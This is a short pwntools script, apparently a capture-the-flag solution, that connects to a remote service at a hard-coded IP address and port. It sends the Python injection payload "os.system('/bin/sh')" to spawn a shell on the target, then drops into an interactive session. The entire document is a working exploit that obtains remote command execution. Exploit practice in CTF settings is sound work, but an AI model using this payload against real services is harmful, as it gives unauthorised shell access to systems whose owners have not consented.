from pwn import *
p=remote("111.198.29.45","54544")
p.recv()
p.sendline("os.system('/bin/sh')")
p.interactive()
